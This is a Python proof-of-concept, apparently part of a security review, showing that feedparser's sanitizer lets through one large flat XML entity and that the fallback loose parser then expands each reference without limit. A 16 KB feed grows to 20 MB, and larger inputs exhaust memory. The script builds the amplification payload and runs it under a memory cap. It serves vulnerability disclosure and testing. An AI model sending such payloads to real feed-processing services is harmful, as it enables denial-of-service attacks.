"""R06: memory amplification via "safe" internal entities + loose-parser fallback.

replace_doctype() (sanitizer.py:906-950) keeps internal entities whose value
has no '&' (so no nesting / no billion-laughs). But one *large* flat entity
referenced many times still expands quadratically in input size.

  * Strict path: modern expat (>= 2.4) has an amplification limit, so it
    aborts with a SAXParseException ...
  * ... and feedparser then falls back to the loose sgmllib parser
    (api.py:262-272), whose handle_entityref (mixin.py:362-379) substitutes
    the entity text for every reference with no limit at all.

A 16 KB document expands to 20 MB, a 68 KB one to 300 MB (~890 MiB peak RSS), and a 148 KB one
would need ~1.6 GB. This runs in a child
with a 1 GiB address-space limit so it cannot hurt the machine; the child
reports MemoryError. Without such a limit the GitHub runner would swap/OOM,
and the build's MAX_FEED_BYTES limit does not prevent it (the input is small).

Run:  python -I r06_entity_amplification.py   (stdlib + feedparser, no network)
"""
import subprocess
import sys
import textwrap

child = textwrap.dedent("""
    import io, resource, sys, time, pyexpat, feedparser
    limit = int(sys.argv[1])
    if limit:
        resource.setrlimit(resource.RLIMIT_AS, (limit, limit))
    ent_len, refs = int(sys.argv[2]), int(sys.argv[3])
    doc = (
        "<?xml version='1.0'?>\\n<!DOCTYPE rss [\\n<!ENTITY a \\"" + "A" * ent_len + "\\">\\n]>\\n"
        "<rss version='2.0'><channel><title>t</title><item><title>x</title>"
        "<description>" + "&a;" * refs + "</description></item></channel></rss>"
    ).encode()
    t = time.time()
    try:
        d = feedparser.parse(io.BytesIO(doc))
        s = d.entries[0].get("summary", "")
        rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024
        print(f"input {len(doc)/1e3:.0f} KB -> summary {len(s)/1e6:.1f} MB, peak RSS {rss:.0f} MiB, {time.time()-t:.1f}s; "
              f"bozo_exception={d.get('bozo_exception')!s:.60}  ({pyexpat.EXPAT_VERSION})")
    except MemoryError:
        print(f"input {len(doc)/1e3:.0f} KB -> MemoryError after {time.time()-t:.1f}s (RLIMIT_AS={limit>>20} MiB)")
""")

# small, unlimited: shows the expansion factor and the strict->loose fallback
for args in (["0", "10000", "2000"], ["0", "50000", "6000"], ["1073741824", "100000", "16000"]):
    out = subprocess.run([sys.executable, "-I", "-c", child, *args], capture_output=True, text=True, timeout=300)
    print((out.stdout + out.stderr).strip().splitlines()[-1])
